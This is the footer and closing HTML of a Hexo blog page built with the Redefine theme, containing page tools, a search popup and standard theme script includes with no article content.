    <div class="info-container py-3 text-center">
        
            <div class="customize-info my-1">关山初度尘未洗，策马扬鞭再奋蹄。</div>
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-circle-info fa-beat-fade" style="--fa-beat-fade-opacity: 0.67; --fa-beat-fade-scale: 1.075;" ></i>&nbsp;&nbsp;<a href="/">韩乔落</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        125 posts in total
                    </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>


<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/Swup.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/SwupSlideTheme.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/SwupScriptsPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/SwupProgressPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/SwupScrollPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/SwupPreloadPlugin.min.js" ></script>
<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/imageViewer.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/utils.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/main.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/layouts/navbarShrink.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/scrollTopBottom.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/lightDarkSwitch.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/layouts/categoryList.js" ></script>


    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/localSearch.js" ></script>



    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/codeBlock.js" ></script>



    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/layouts/lazyload.js" ></script>



    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/runtime.js" ></script>
    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/odometer.min.js" ></script>
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/assets/odometer-theme-minimal.css">



  <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/Typed.min.js" ></script>
  <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/plugins/typed.js" ></script>







    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/anime.min.js" ></script>




    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/tocToggle.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/layouts/toc.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/plugins/tabs.js" data-swup-reload-script></script>


<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/moment-with-locales.min.js" data-swup-reload-script></script>
<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/layouts/essays.js" data-swup-reload-script></script>




	
</body>

</html>